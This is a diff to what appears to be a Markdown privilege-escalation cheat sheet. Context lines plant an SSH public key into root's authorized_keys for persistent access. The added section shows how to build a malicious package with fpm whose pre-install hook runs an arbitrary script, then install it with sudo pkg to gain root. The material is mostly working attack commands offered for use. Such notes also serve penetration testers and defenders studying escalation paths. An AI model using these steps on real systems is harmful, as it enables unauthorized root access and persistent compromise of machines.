@@ -652,3 +652,24 @@ mkdir .ssh
 echo "<public_key_here>" > .ssh/authorized_keys
 cp --parents .ssh/authorized_keys /root
 ```
+
+### Using fpm to generate a package (pkg exploit)
+https://github.com/jordansissel/fpm
+
+```
+targets:
+deb
+rpm
+solaris
+freebsd
+tar
+directories
+Mac OS X .pkg files (osxpkg)
+pacman (ArchLinux) packages
+
+generate your pkg:
+fpm -n x -s dir -t freebsd -a all --before-install ./x.sh /tmp/temporary
+
+running your pkg:
+sudo pkg install -y --no-repo-update ./x-1.0.txz
+```
